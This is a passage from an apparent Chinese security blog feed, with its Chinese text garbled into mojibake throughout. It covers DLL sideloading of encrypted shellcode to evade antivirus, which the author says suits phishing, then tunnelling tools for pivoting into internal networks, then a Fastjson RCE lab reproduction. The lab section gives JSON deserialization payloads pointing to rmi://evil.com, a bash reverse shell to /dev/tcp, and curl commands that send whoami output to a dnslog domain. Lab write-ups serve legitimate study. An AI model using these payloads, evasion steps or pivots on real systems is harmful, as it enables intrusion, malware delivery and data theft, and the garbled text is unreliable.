class="hljs-built_in">path</span>=C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>-natives&quot; &quot;-Djna.tmpdir=C:\Users\Lucifer\Desktop\w\.<br>......<br>tmpdir=&quot;C:\Users\Lucifer\Desktop\w\PCL&quot; -jar &quot;C:\Users\Lucifer\Desktop\w\PCL\JavaWrapper.jar&quot; <span class="hljs-built_in">net</span>.minecraft.client.main.Main --username <span class="hljs-number">5621</span> --version <span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span> --gameDir &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>&quot; --assetsDir &quot;C:\Users\Lucifer\Desktop\w\.minecraft\assets&quot; --assetIndex <span class="hljs-number">8</span> --uuid <span class="hljs-number">00000</span>FFFFFFFFFFFFFFFFFFFFFFE9ACA --accessToken <span class="hljs-number">00000</span>FFFFFFFFFFFFFFFFFFFFFFE9ACA --clientId $&#123;clientid&#125; --xuid $&#123;auth_xuid&#125; --userType msa --versionType PCL --width <span class="hljs-number">854</span> --height <span class="hljs-number">480</span><br><span class="hljs-built_in">echo</span> æ¸¸æˆå·²é€€å‡ºã€‚<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>ä¸­é—´æˆ‘åˆ æ‰äº†å¾ˆå¤šï¼Œå› ä¸ºå¯¹æˆ‘ä»¬æ¥è¯´æ— ç”¨ã€‚æˆ‘æ‹¿ç€é—®äº†ä¸€ä¸‹gemini3ï¼Œè¯´æ˜¯å·¥ä½œç›®å½•çš„é—®é¢˜ï¼Œåœ¨å¯åŠ¨è„šæœ¬ä¸­æœ‰ä¸€ä¸ª<code>cd /D &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\1.20.2\&quot;</code>è¿è¡Œäº†è¿™è¡Œä¹‹åï¼Œæˆ‘ä»¬çš„å·¥ä½œç›®å½•å°±åˆ°äº†mcçš„ç‰ˆæœ¬ç›®å½•ä¸­å»äº†ï¼Œç„¶åæˆ‘ä»£ç ä¸­è¯»å–shellcodeæ—¶ä½¿ç”¨çš„æ˜¯ç›¸å¯¹ç›®å½•ï¼Œé‚£ä»–å°±ä¼šåœ¨è¿™ä¸ªmcçš„ç‰ˆæœ¬ç›®å½•ä¸­å»è¯»å–æˆ‘åŠ å¯†çš„shellcodeï¼Œè¦è§£å†³ä¹Ÿå¾ˆç®€å•ï¼Œä¸€ä¸ªæ˜¯å°†åŠ å¯†shellcodeæ”¾åˆ°è¿™ä¸ªmcçš„ç‰ˆæœ¬ç›®å½•ä¸­ï¼Œå¦å¤–ä¸€ä¸ªåŠæ³•å°±æ˜¯åœ¨ä»£ç ä¸­è·å–å½“å‰dllç›®å½•ï¼Œç„¶åå†æ‹¼æ¥<br><img src="https://i.ibb.co/4ZG9bF4G/image.png"><br>æˆ‘å«Œéº»çƒ¦å°±æ²¡å»å¼„äº†ï¼Œç›´æ¥å°†åŠ å¯†çš„shellcodeæ”¾åœ¨mcçš„ç‰ˆæœ¬ç›®å½•ä¸‹ã€‚å½“ç„¶å¦‚æœè¦æ‹¿ç€å»é’“é±¼çš„è¯ï¼Œè¿˜æ˜¯è¦åŠ¨æ€é…ç½®ç›®å½•ï¼Œä¸ç„¶mcç‰ˆæœ¬ç›®å½•ä¸‹æœ‰ä¸€ä¸ªdllæ–‡ä»¶éå¸¸å¯ç–‘ï¼Œè¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ•ˆæœã€‚<br><img src="https://i.ibb.co/xtPKTVsg/image.png"><br>è‡³äºå›½å¤–çš„edrä»€ä¹ˆçš„æˆ‘æ²¡å»è¯•ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰å®‰è£…åŒ…</p><p>è¦æ‰¾ç™½ç¨‹åºå’Œé»‘dllå¯ä»¥å»è¿™ä¸ªç½‘ç«™æ‰¾<code>https://hijacklibs.net/</code></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å…æ€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>éš§é“å·¥å…·çš„ä½¿ç”¨</title>
    <link href="/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>ç¯å¢ƒçš„è¯éšä¾¿è‡ªå·±æ­å»ºä¸€ä¸ªå†…ç½‘ç¯å¢ƒï¼Œæˆ–è€…ç”¨ç½‘ä¸Šçš„åŸŸç¯å¢ƒæˆ–è€…å†…ç½‘é¶åœºä¹Ÿå¥½<br>æˆ‘çš„ç½‘ç»œæƒ…å†µæ˜¯è¿™æ ·çš„</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">host&lt;--&gt;wi<span class="hljs-symbol">n10</span>&lt;--&gt;wi<span class="hljs-symbol">n7</span><br>å³æœ¬æœºå¯ä»¥è®¿é—®wi<span class="hljs-symbol">n10</span>ï¼Œwi<span class="hljs-symbol">n10</span>å¯ä»¥å‡ºç½‘ï¼Œwi<span class="hljs-symbol">n10</span>æœ‰<span class="hljs-number">2</span>å¼ ç½‘å¡ï¼Œå¯ä»¥è®¿é—®wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/dsvntH3q/image.png"><br>ç‰©ç†æœºæ— æ³•è®¿é—®è¿™ä¸ªå†…ç½‘é¡µé¢ï¼Œè™šæ‹Ÿæœºwin10å¯ä»¥è®¿é—®<br><img src="https://i.ibb.co/RGWxtrb1/image.png"></p><h1 id="frp-proxifier"><a href="#frp-proxifier" class="headerlink" title="frp + proxifier"></a>frp + proxifier</h1><p>æœåŠ¡ç«¯é…ç½®æ–‡ä»¶</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = test@<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>ç„¶åæœåŠ¡ç«¯æŒ‡å®šé…ç½®æ–‡ä»¶è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c frps.ini<br></code></pre></td></tr></table></figure><p>å°†frpc.exeä¼ åˆ°win10ï¼Œé…ç½®æ–‡ä»¶è¿™æ ·å†™</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x <span class="hljs-comment">#è¿™é‡Œå¡«ä½ æœåŠ¡å™¨çš„ip</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = test@<span class="hljs-number">123</span><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1081</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">plugin_user</span> = test<br><span class="hljs-attr">plugin_passwd</span> = <span class="hljs-number">123</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>ç„¶ååŒæ ·æŒ‡å®šé…ç½®æ–‡ä»¶è¿è¡Œ</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc.exe -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/CshLNnx3/image.png"><br>è¿™ä¸ªæ—¶å€™å·²ç»è¿æ¥æˆåŠŸï¼Œç„¶åä½¿ç”¨proxifierä»£ç†æµé‡<br><img src="https://i.ibb.co/cScYRbvf/image.png"><br>é€‰æ‹©socks5åè®®ï¼Œè§„åˆ™é»˜è®¤å³å¯<br><img src="https://i.ibb.co/whL2nRYR/image.png"><br>ç„¶åç‰©ç†æœºå°±å¯ä»¥è®¿é—®win7çš„æœåŠ¡äº†<br><img src="https://i.ibb.co/bjnP1Ys9/image.png"><br>å¦‚æœæœ‰å¤šçº§çš„ä¸»æœºé‚£å°±è¦å¤šçº§çš„ä»£ç†<br>vps&lt;â€“&gt;win10(è¾¹ç•Œä¸»æœºï¼Œå¯ä»¥è®¿é—®å†…ç½‘å’Œå¤–ç½‘)&lt;â€“&gt;win10 a(å†…ç½‘)&lt;â€“&gt;win10 b<br>å¦‚æœæƒ³ä»£ç†åˆ°win10 bçš„è¯é‚£å°±è¦vpsè¿è¡ŒæœåŠ¡ç«¯ï¼Œwin10è¿è¡ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼Œwin10 aè¿è¡ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ï¼Œç„¶åwin10 è¿è¡Œå®¢æˆ·ç«¯ï¼Œè¿™æ ·å±‚å±‚ä»£ç†ä¸‹æ¥ï¼Œå½“ç„¶æ˜¯æ¯ä¸€æ¬¡çš„ç½‘æ®µä¸ä¸€æ ·èœè‚´è¿™æ ·ï¼Œå¦‚æœç½‘æ®µä¸€æ ·åœ¨win10å°±å¯ä»¥è®¿é—®win10 bçš„è¯å°±æ²¡å¿…è¦è¿™æ ·äº†</p><h1 id="venom-proxifier"><a href="#venom-proxifier" class="headerlink" title="venom + proxifier"></a>venom + proxifier</h1><p>æœåŠ¡ç«¯è¿è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin_linux_x86</span> -lport <span class="hljs-number">7000</span> -passwd test@<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>win10è¿è¡Œagent</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">.\agent.exe -rhost <span class="hljs-number">192.210</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -rport <span class="hljs-number">7000</span> -passwd test<span class="hljs-title">@123</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/q3ywKvTT/image.png"><br>ç„¶åè¿›å…¥node 1å¼€å¯socksï¼Œç„¶ååŒæ ·çš„åœ¨proxifierè¿æ¥å¥½ï¼Œç‰©ç†æœºåˆå¯ä»¥è®¿é—®win7çš„ç½‘ç»œäº†<br><img src="https://i.ibb.co/4ZQybs2q/image.png"><br>venomåœ¨å¤šçº§çº§è”çš„æ—¶å€™ä¼šæ¯”è¾ƒæ–¹ä¾¿ï¼Œæ¯”å¦‚vpsâ€“Aâ€“Bä»£ç†ï¼ŒAå¯ä»¥å‡ºç½‘ï¼ŒBä¸å¯ä»¥å‡ºç½‘ï¼Œè¿™ä¸ªæ—¶å€™åªè¦Aè¿è¡ŒagentæŒ‡å®šæœåŠ¡ç«¯ä¸ºvpsï¼Œå‡è®¾æ­¤å¤„Aåœ¨vpsä¸ºèŠ‚ç‚¹1ï¼ŒBä¸ºèŠ‚ç‚¹2ï¼Œç„¶ååœ¨vpsçš„venomç»ˆç«¯<code>goto 1</code>è¿›å…¥èŠ‚ç‚¹1ï¼Œç„¶å<code>listen port</code>ï¼ŒBè¿è¡ŒagentæŒ‡å®šAä¸ºæœåŠ¡ç«¯ï¼Œç„¶ååœ¨venomå¤„<code>goto 2</code>å¼€å¯socks<code>socks port</code>å³å¯å®ç°å¤šçº§ä»£ç†ï¼Œè¿™æ ·æ¯”frpå¥½ä¸€äº›ï¼Œä¸ç”¨å†™å¾ˆå¤šé…ç½®æ–‡ä»¶</p><h1 id="ligolo-ng"><a href="#ligolo-ng" class="headerlink" title="ligolo-ng"></a>ligolo-ng</h1><p>ligolo-ngæˆ‘ç›®å‰ä½¿ç”¨æ˜¯å‘ç°åªèƒ½æœ¬æœºä½¿ç”¨ï¼Œå¦‚æœæƒ³è¦webè®¿é—®é¡µé¢çš„è¯ï¼Œvpså¾—æœ‰å›¾å½¢åŒ–ç•Œé¢ï¼Œå¦åˆ™åªèƒ½å‘½ä»¤è¡Œè®¿é—®<br>linuxä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span><span class="hljs-built_in"> user </span>kali mode tun ligolo<br></code></pre></td></tr></table></figure><p>æ·»åŠ è™šæ‹Ÿç½‘å¡ï¼Œç„¶åå—å®³è€…ä¸»æœºå¯åŠ¨agent<br><img src="https://i.ibb.co/C3zkVvRK/image.png"><br>ç„¶ååœ¨æœåŠ¡ç«¯ä¸Šç»™ç½‘å¡æ·»åŠ ç½‘æ®µå¹¶åœ¨sessionä¸­startå¯åŠ¨<br><img src="https://i.ibb.co/tpG6F958/image.png"><br>ç„¶åå°±å¯ä»¥è®¿é—®å†…ç½‘äº†<br><img src="https://i.ibb.co/4wYr3czc/image.png"><br>windowsçš„è¯æœ‰ç‚¹éº»çƒ¦<br><img src="https://i.ibb.co/G4V7bJP3/image.png"><br>æˆ–è®¸æ˜¯å¯ä»¥æ‰¾ä¸€ä¸ªæ–¹æ³•è®©æˆ‘ä»¬çš„ä¸»æœºåœ¨è®¿é—®æ—¶è¿›è¿‡vpsçš„ä»£ç†ï¼Œè¿™æ ·å­çš„è¯å°±å¯ä»¥ä¸ç”¨ä¸€ä¸ªæœ‰å›¾å½¢åŒ–ç•Œé¢çš„vpsäº†ï¼Œè¿™ä¸ªè¿˜åœ¨ç ”ç©¶ä¸­</p><h1 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h1><p>ç›®å‰è¿˜åœ¨æ‘¸ç´¢ä¸­</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
      <tag>tunnel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjsonæ¼æ´å¤ç°</title>
    <link href="/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>ä»¥ä¸‹æ¼æ´éƒ½å¯ä»¥ä»vulhubä¸‹è½½<br><a href="https://github.com/vulhub/vulhub/tree/master/fastjson">https://github.com/vulhub/vulhub/tree/master/fastjson</a></p><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>fastjsonä¸ºäº†è¯»å–å¹¶åˆ¤æ–­ä¼ å…¥çš„å€¼æ˜¯ä»€ä¹ˆç±»å‹ï¼Œå¢åŠ äº†autotypeæœºåˆ¶å¯¼è‡´äº†æ¼æ´äº§ç”Ÿã€‚<br>ç”±äºè¦è·å–jsonæ•°æ®è¯¦ç»†ç±»å‹ï¼Œæ¯æ¬¡éƒ½éœ€è¦è¯»å–@typeï¼Œè€Œ@typeå¯ä»¥æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»è°ƒç”¨å…¶setï¼Œgetï¼Œisæ–¹æ³•ï¼Œå¹¶ä¸”ç”±äºååºåˆ—åŒ–çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›®æ ‡ç±»çš„setæ–¹æ³•è‡ªç”±çš„è®¾ç½®ç±»çš„å±æ€§å€¼ã€‚<br>é‚£ä¹ˆä¾›ç»™åˆ¶åªè¦å‡†å¤‡rmiæœåŠ¡å™¨å’ŒwebæœåŠ¡å™¨ï¼Œå°†rmiç»å¯¹è·¯å¾„æ³¨å…¥åˆ°lookupæ–¹æ³•ä¸­ï¼Œå—å®³è€…jndiæ¥å£ä¼šæŒ‡å‘æ”»å‡»è€…æ§åˆ¶rmiæœåŠ¡å™¨ï¼Œjndiæ¥å£ä»æ”»å‡»è€…æ§åˆ¶çš„webæœåŠ¡å™¨è¿œç¨‹åŠ è½½æ¶æ„ä»£ç å¹¶æ‰§è¡Œï¼Œå½¢æˆRCE</p><h1 id="æ¼æ´åˆ©ç”¨è¯¦è§£"><a href="#æ¼æ´åˆ©ç”¨è¯¦è§£" class="headerlink" title="æ¼æ´åˆ©ç”¨è¯¦è§£"></a>æ¼æ´åˆ©ç”¨è¯¦è§£</h1><ul><li>æ”»å‡»è€…è®¿é—®ç›®æ ‡ç½‘ç«™ï¼ŒæŠ“åŒ…ä¿®æ”¹è¯·æ±‚ä½“ï¼Œå°†æ„é€ çš„æ¶æ„ç±»ä¿¡æ¯å‘é€ç»™ç›®æ ‡æœº</li><li>ç›®æ ‡å¯¹jsonååºåˆ—åŒ–æ—¶ä¼šåŠ è½½æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä¿¡æ¯ï¼Œå‘rmiæœåŠ¡å™¨è¯·æ±‚å¾…æ‰§è¡Œçš„å‘½ä»¤</li><li>rmiæœåŠ¡å™¨è¯·æ±‚è¿œç¨‹æœºå™¨çš„classï¼Œå¾—åˆ°æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤</li><li>rmiå°†è¿œç¨‹åŠ è½½çš„classä½œä¸ºå“åº”è¿”å›ç»™é¶æœºæœåŠ¡å™¨</li><li>é¶æœºæ‰§è¡Œæ¶æ„ä»£ç </li></ul><p>é™„ä¸Šå¤§ä½¬å›¾è§£<br><img src="https://i.ibb.co/PGVK2pfv/image.png"></p><h1 id="1-2-24-RCE"><a href="#1-2-24-RCE" class="headerlink" title="1.2.24-RCE"></a>1.2.24-RCE</h1><p>dockerå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/fastjson/1.2.24-rce;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>è®¿é—®ip:8090<br><img src="https://i.ibb.co/p6rHYMH2/image.png"></p><h2 id="yakitæ¢­å“ˆ"><a href="#yakitæ¢­å“ˆ" class="headerlink" title="yakitæ¢­å“ˆ"></a>yakitæ¢­å“ˆ</h2><p>åœ¨yakitå¼€å¯åè¿æœåŠ¡å™¨å¹¶é…ç½®payload<br><img src="https://i.ibb.co/nMYC7DBf/image.png"><br>(å°†javaç‰ˆæœ¬ä¿®æ”¹ä¸º8)<br>yakitæŠ“åŒ…ï¼Œæ ¹æ®ç»™çš„pocä¿®æ”¹jsonæ•°æ®<br><img src="https://i.ibb.co/fzj1YLvj/image.png"><br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://evil.com:9999/TouchFile&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å°†rmiåœ°å€æ”¹ä¸ºæˆ‘ä»¬çš„åœ°å€<br><img src="https://i.ibb.co/dJHbDqyB/image.png"><br>å¯ä»¥çœ‹åˆ°åè¿æœåŠ¡å™¨å·²ç»æœ‰äº†è¿æ¥<br><img src="https://i.ibb.co/5mqp92K/image.png"><br>åœ¨dockerå®¹å™¨ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å‘½ä»¤å·²ç»æ‰§è¡Œ<br><img src="https://i.ibb.co/tphPHXKL/image.png"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>å°†å‘½ä»¤ä¿®æ”¹ä¸ºåå¼¹shell,å¹¶åœ¨yakitç›‘å¬ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.184.196/8088 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/j9Sc4V77/image.png"><br>åå¼¹shellæˆåŠŸ<br><img src="https://i.ibb.co/mrJmbM5J/image.png"></p><p>ä½¿ç”¨dnslogå¤–å¸¦å‘½ä»¤å›æ˜¾<br>é¦–å…ˆåœ¨yakitç”³è¯·ä¸€ä¸ªdnslogåŸŸå<br><img src="https://i.ibb.co/C505ddkX/image.png"><br>ç„¶ååœ¨åè¿æœåŠ¡å™¨ä¸­å°†å‘½ä»¤ä¿®æ”¹ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://lyhggxfmux.iyhc.eu.org/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p>åœ¨Shellä¸­ï¼Œåå¼•å·ç”¨äºå‘½ä»¤æ›¿æ¢ï¼Œå³å…ˆæ‰§è¡Œå†…éƒ¨çš„å‘½ä»¤ï¼Œç„¶åå°†ç»“æœåµŒå…¥åˆ°å¤–éƒ¨å‘½ä»¤ä¸­ã€‚<br>éšåé‡æ–°å‘åŒ…ï¼Œåœ¨dnslogå¤„çœ‹åˆ°å‘½ä»¤æ‰§è¡Œç»“æœ<br><img src="https://i.ibb.co/xt4Fsx15/image.png"></p><h1 id="1-2-47-RCE"><a href="#1-2-47-RCE" class="headerlink" title="1.2.47-RCE"></a>1.2.47-RCE</h1><p>Fastjson æ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾ JSON è§£æå™¨ï¼Œå…¶æ€§èƒ½ä¼˜è¶Šï¼Œè¢«å¹¿æ³›åº”ç”¨äºå„å¤§å‚å•†çš„ Java é¡¹ç›®ä¸­ã€‚Fastjson äº 1.2.24 ç‰ˆæœ¬åå¢åŠ äº†ååºåˆ—åŒ–ç™½åå•ï¼Œè€Œåœ¨ 1.2.48 ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹æ®Šæ„é€ çš„ JSON å­—ç¬¦ä¸²ç»•è¿‡ç™½åå•æ£€æµ‹ï¼ŒæˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚<br>å¯ä»¥æ ¹æ®æ¼æ´é¡µé¢æ‰‹å·¥æ­å»ºç¯å¢ƒåˆ©ç”¨ï¼Œæ³¨æ„javaçš„ç‰ˆæœ¬å°±è¡Œã€‚æˆ‘è¿™é‡Œä½¿ç”¨yakitä¸€æŠŠæ¢­å“ˆ</p><p>dockerå¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/fastjson/1.2.47-rce;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>è®¿é—®ip:8090<br><img src="https://i.ibb.co/MDDLYktC/image.png"></p><h2 id="yakitæ¢­å“ˆ-1"><a href="#yakitæ¢­å“ˆ-1" class="headerlink" title="yakitæ¢­å“ˆ"></a>yakitæ¢­å“ˆ</h2><p>åœ¨yakitå¼€å¯åè¿æœåŠ¡å™¨å¹¶é…ç½®payload,åŒæ—¶å¼€å¯dnslogå¹¶éšæœºæ³¨å†ŒåŸŸå<br>æ¶æ„ç±»é€‰runtimeexecï¼Œjavaç‰ˆæœ¬è®¾ç½®ä¸º8<br><img src="https://i.ibb.co/XfPn7RRx/image.png"><br>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://shcjkonvet.iyhc.eu.org/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p>yakitæŠ“åŒ…å‘é€åˆ°web fuzzï¼Œæ ¹æ®payloadä¿®æ”¹rmiåœ°å€</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://evil.com:9999/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/8gMg1fXW/image.png"><br>è¿”å›400æ²¡å…³ç³»ï¼ŒæŸ¥çœ‹åè¿æœåŠ¡å™¨å‘ç°æœ‰äº†è¯·æ±‚ï¼Œå†çœ‹dnslogï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´ä¹‹åæœ‰äº†å›æ˜¾ï¼ˆyakitçš„dnslogæœ‰äº›æ˜¯å›½å¤–çš„ï¼Œéœ€è¦ç­‰ä¸€æ®µæ—¶é—´,å¯ä»¥å¤šå‘å‡ æ¬¡åŒ…ï¼‰<br><img src="https://i.ibb.co/5Xx33RMs/image.png"></p><h2 id="åå¼¹shell-1"><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>åœ¨ç«¯å£ç›‘å¬å‡ºç›‘å¬ä¸€ä¸ªç«¯å£ï¼ŒåŒæ—¶ç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„å‘½ä»¤ï¼Œåœ¨åè¿æœåŠ¡å™¨å¤„é‡æ–°ç”Ÿæˆæ¶æ„ç±»<br><img src="https://i.ibb.co/sv1dymfC/image.png"><br>webfuzzå‘åŒ…åæ”¶åˆ°shell<br><img src="https://i.ibb.co/7tRW2cGC/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiroå¤ç°</title>
    <link href="/shiro%E5%A4%8D%E7%8E%B0/"/>
    <url>/shiro%E5%A4%8D%E7%8E%B0/</url>
    
